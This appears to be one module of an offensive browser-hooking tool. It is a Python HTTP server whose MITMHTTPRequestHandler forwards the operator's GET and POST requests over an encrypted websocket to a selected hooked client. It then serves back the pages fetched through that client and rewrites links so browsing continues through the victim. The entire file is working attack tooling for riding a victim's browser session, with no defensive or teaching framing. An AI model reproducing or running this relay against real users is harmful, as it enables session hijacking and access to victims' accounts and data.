import asyncio
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import socksUtil
import cryptoUtil
import datetime

host = "localhost"
port = 8001
cache = {}


class MITMHTTPRequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        asyncio.run(self.performRequest('GET'))

    def do_POST(self):
        asyncio.run(self.performRequest('POST'))

    async def performRequest(self, method):

        if "favicon" in self.path:
            return
        args = self.path.split('/')
        skt = int(args[1]) # índice del socket
        path = 'base_url'
        if len(args) > 2:
            path = args[2] # path que se va a consultar en el cliente, sin el índice
        
        # no devolver el script del websocket para no crear nuevas conexiones
        if "websocket.js" in str(path).lower():
            return
        print(path)
        response = {}
        cacheKey = str(datetime.datetime.now())
        
        # Construye el objeto de la request
        request = {
            "comand": "mitm",
            "method": method,
            "url": path,
            "key": cacheKey
        }
        
        # Si es POST incluye el body
        if method == 'POST':
            request['body'] = self.rfile.read(
                int(self.headers["Content-Length"])).decode("utf-8")
        try:
            socket = socksUtil.sockets[skt]
            await cryptoUtil.sendSecretMessage(socket, json.dumps(request))
            while cacheKey not in cache:
                pass
            response = cache[cacheKey]
            self.send_response(200)
            self.send_header("Content-type", response["type"])
        except  Exception as e:
            response["content"] = f'{method} Request error for socket with id {skt}: {e}'
            self.send_response(404)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(response["content"].replace('href=\"/', f'href=\"/{skt}/').encode("utf-8"))
        cache.pop(cacheKey)

    def log_message(self, format: str, *args) -> None:
        return ""


def start_server(module):
    global mod
    mod = module
    server_address = (host, port)
    httpd = HTTPServer(server_address, MITMHTTPRequestHandler)
    httpd.serve_forever()
